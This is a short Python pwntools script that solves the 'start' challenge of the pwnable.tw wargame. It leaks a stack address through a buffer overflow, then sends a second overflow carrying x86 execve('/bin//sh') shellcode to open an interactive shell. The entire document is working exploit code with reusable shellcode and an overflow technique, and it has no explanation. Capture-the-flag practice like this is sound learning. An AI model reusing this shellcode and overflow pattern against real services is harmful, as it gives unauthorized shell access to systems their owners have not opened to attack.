from pwn import *

BIN = "./start"
DEBUG = 1

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
addr = 0x08048087 

io = process(BIN)
# io = remote("chall.pwnable.tw", 10000)

io.recvuntil("CTF:")
payload = b'A' * 0x14 + p32(addr)
io.send(payload)
esp_addr = u32(io.recv(4))
 
print("[+]Esp address = ", hex(esp_addr))
 
payload = b'A' * 0x14 + p32(esp_addr + 0x14) + shellcode
io.sendline(payload)
io.interactive()